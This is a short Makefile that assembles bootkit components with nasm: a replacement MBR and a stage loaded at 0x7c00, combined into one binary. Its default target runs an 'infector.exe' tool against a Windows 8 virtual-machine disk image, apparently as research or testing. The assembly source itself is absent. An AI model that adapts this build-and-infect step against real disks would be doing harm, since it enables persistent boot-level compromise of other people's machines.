all:bootkit_all.bin
	@echo "success, you can run now"
	./infector.exe  newborn "E:\vms\Windows 8.x x64\win8_x64.img"

bootkit_all.bin: newmbr.bin bootkit0_2_7c00_2.bin  bootkit_all.asm
	@echo build bootkit_all.asm
	nasm "bootkit_all.asm" -o "bootkit_all.bin" -f bin -l "bootkit_all.lst" -Ox -w-orphan-labels -d _DEBUG

newmbr.bin:readsequence_0.asm
	@echo build readsequence_0.asm
	nasm "readsequence_0.asm" -o "newmbr.bin" -f bin -l "newmbr.lst" -Ox -w-orphan-labels

bootkit0_2_7c00_2.bin:readsequence_1.asm
	@echo build readsequence_1.asm
	nasm "readsequence_1.asm" -o "bootkit0_2_7c00_2.bin" -f bin -l "bootkit0_2_7c00_2.lst" -Ox -w-orphan-labels -d _DEBUG

clean:
	@rm -f bootkit_all.bin
	@rm -f bootkit_all.lst
	@rm -f bootkit0_2_7c00_2.bin
	@rm -f bootkit0_2_7c00_2.lst
	@rm -f newmbr.bin
	@rm -f newmbr.lst
